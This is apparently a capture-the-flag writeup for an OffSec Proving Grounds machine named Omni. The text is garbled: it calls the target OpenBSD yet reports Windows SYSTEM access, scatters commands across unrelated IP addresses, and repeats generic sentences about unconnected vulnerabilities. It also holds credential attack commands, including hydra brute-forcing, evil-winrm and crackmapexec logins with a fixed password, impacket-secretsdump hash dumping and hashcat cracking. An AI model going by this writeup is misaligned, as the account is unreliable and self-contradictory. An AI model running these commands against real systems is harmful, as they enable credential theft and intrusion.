---
TitleSEO: "OffSec Proving Grounds — Omni (Easy OpenBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Omni (Easy OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Omni. Constrained Delegation and AS-REP Roasting to achieve easy compromise on OpenBSD."
Keywords: "tryhackme, easy, offsec, forensics"
URL: "https://zurefx.github.io/writeups/htb-omni-457.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-omni-457/"
Date: "2025-06-12"
Tags: "TryHackMe, Easy, OffSec, Forensics"
Section: "writeups"
Lang: "en"
main_img: "htb-omni-457"
Permalink: "/writeups/htb-omni-457.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Omni** is rated **Easy** on OffSec Proving Grounds. It runs **OpenBSD** and the IP address during this analysis was `10.127.232.222`.

### Objectives

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.34.238.8 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p587,22,53 10.121.234.186 -oN scan.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files.

### Service Enumeration

Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.15.158.159/FUZZ
nmap -sCV -p8080,389,445 10.125.85.227 -oN scan.txt
nmap -sCV -p135,25,1433 10.88.144.61 -oN scan.txt
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

### SMB Enumeration

The backup files contained sensitive information that should not have been accessible. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
crackmapexec smb 10.44.152.210 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.39.3.171 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Exploitation

### Vulnerability Identification

The target system was identified as running a vulnerable version of the service. The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

Key finding: **Weak Service Permissions**.

Group Policy Preferences contained encrypted but recoverable credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Initial Access

Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
feroxbuster -h
evil-winrm -i 10.81.131.145 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.39.110.57 -u administrator -p 'P@ssw0rd!' --shares
```

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

## Privilege Escalation

### Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine. Command injection was possible through unsanitized user input in the search functionality.

```powershell
nmap -sCV -p110,21,80 10.32.227.81 -oN scan.txt
```

### Exploitation

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.65.229.84
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.46.39.35/FUZZ
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.89.169.18 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine.

## Summary

### Tools Used

- `enum4linux`
- `evil-winrm`
- `sqlmap`
- `chisel`
- `burpsuite`
- `hydra`
- `hashcat`

### Key Takeaways

- Constrained Delegation
- AS-REP Roasting
- Weak Service Permissions
